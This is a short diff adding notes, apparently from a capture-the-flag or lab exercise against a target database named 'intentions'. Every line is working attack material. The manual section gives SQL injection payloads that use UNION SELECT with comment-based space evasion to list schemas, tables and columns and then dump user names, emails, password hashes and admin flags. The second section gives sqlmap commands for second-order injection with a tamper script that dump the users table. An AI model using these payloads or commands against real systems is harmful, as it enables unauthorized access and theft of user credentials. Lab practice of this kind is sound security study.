@@ -1,0 +1,8 @@
+manual payload
+')/**/union/**/select/**/1,(select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),3,4,5# => list database
+')/**/union/**/select/**/1,(select/**/group_concat(table_name,':',column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='intentions'),3,4,5# => list table, column
+')/**/union/**/select/**/1,(select/**/group_concat(name,':',email,':',password,':',admin)/**/from/**/users),3,4,5# => dump
+
+using automation tools with sqlmap
+sqlmap -r updateGenre.req --second-req getFeed.req --dbms mysql --batch --tamper=space2comment -D intentions -T users --dump
+sqlmap -r updateGenre2.req --second-req getImage2.req --dbms mysql --batch --tamper=space2comment -D intentions -T users --dump
